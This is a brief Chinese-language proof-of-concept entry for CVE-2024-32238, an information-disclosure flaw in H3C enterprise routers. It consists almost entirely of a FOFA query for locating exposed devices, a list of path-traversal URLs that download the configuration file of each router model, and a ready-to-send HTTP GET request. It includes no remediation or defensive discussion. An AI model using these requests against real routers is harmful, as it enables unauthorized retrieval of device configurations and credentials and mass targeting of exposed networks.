## H3C路由器userLogin.asp信息泄漏漏洞(CVE-2024-32238)



## fofa

```
app="H3C-Ent-Router"
```



## poc

```
/userLogin.asp/../actionpolicy_status/../ER8300G2.cfg
/userLogin.asp/../actionpolicy_status/../M60.cfg
/userLogin.asp/../actionpolicy_status/../GR8300.cfg
/userLogin.asp/../actionpolicy_status/../GR5200.cfg
/userLogin.asp/../actionpolicy_status/../GR3200.cfg
/userLogin.asp/../actionpolicy_status/../GR2200.cfg
/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
/userLogin.asp/../actionpolicy_status/../ER8300G2.cfg
/userLogin.asp/../actionpolicy_status/../ER6300G2.cfg
/userLogin.asp/../actionpolicy_status/../ER5200G2.cfg
/userLogin.asp/../actionpolicy_status/../ER5200.cfg
/userLogin.asp/../actionpolicy_status/../ER5100.cfg
/userLogin.asp/../actionpolicy_status/../ER3260G2.cfg
/userLogin.asp/../actionpolicy_status/../ER3260.cfg
/userLogin.asp/../actionpolicy_status/../ER3200G2.cfg
/userLogin.asp/../actionpolicy_status/../ER3200.cfg
/userLogin.asp/../actionpolicy_status/../ER3108GW.cfg
/userLogin.asp/../actionpolicy_status/../ER3108G.cfg
/userLogin.asp/../actionpolicy_status/../ER3100G2.cfg
/userLogin.asp/../actionpolicy_status/../ER3100.cfg
/userLogin.asp/../actionpolicy_status/../ER2200G2.cfg
```

```
GET /userLogin.asp/../actionpolicy_status/../ER8300G2.cfg HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Host:
```

![image-20240524233044125](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405242330199.png)

![image-20240524233826952](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405242338044.png)